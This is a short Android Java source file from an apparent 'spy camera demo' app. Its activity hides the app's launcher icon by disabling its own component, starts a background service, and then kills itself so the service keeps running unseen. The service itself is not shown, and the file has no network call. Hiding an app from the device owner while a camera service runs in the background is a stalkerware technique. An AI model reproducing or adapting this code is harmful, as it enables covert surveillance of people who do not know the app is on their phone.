package com.example.spycamerademo;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Button;

public class ServicesDemo extends Activity  {
	Button buttonStart, buttonStop,buttonNext;

	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		//Hide Icon
		PackageManager p = getPackageManager();
		p.setComponentEnabledSetting(getComponentName(),
		PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
		PackageManager.DONT_KILL_APP);
		
		startService(new Intent(this, MyService.class));
		
		//Self terminate, leave the service running
		System.exit(1);

	}

}